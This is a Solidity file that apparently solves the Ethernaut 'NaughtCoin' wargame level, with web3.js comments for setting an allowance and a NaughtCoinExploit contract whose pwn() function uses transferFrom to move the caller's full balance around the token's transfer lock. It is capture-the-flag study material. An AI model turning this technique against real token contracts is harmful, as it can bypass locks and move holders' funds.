// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24; //Match  compiler from imported ERC-contract

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/9b3710465583284b8c4c5d2245749246bb2e0094/contracts/token/ERC20/ERC20.sol";

//For some reason I had to manually create a new contract object with web3js, as the existing instance did not enable me the use of approve.
//Cheatsheet:
//Got ERC20-ABI from here: https://ethereumdev.io/abi-for-erc20-contract-on-ethereum/
//const newContractABI = [â€¦];
//const newERCContract = new web3.eth.Contract(newContractABI,contract.address);

//call() for view only functions, send({from: }) for tx
//const nr = await newERCContract.methods.balanceOf(player).call(); (you could also just reverse engineer this)

//As this is a very big number, it will lead to errors if not converted to a BN for further calculations.
//const nr_string = nr.toLocaleString('fullwide', {useGrouping:false});
//const nr_BN = await new web3.utils.BN(nr_string).toString();

//Set allowance for attack-contract
//newERCContract.methods.approve(_thiscontract_,nr_BN).send({from:player})

contract NaughtCoinExploit {
    address contractAddress =
        address(0x0749F556121209F0cc1bC442B7FfC3709C286Db1);

    function pwn() public {
        ERC20 naughtCoin = ERC20(contractAddress);
        uint256 balance = naughtCoin.balanceOf(msg.sender);
        ERC20(contractAddress).transferFrom(msg.sender, address(this), balance);
    }
}


0xa25A2521DBf98AA8d529B87BD8530A431cc29Ced
0xa25A2521DBf98AA8d529B87BD8530A431cc29Ced
0xa25a2521DBf987502A92f1cadA45B56F00000000
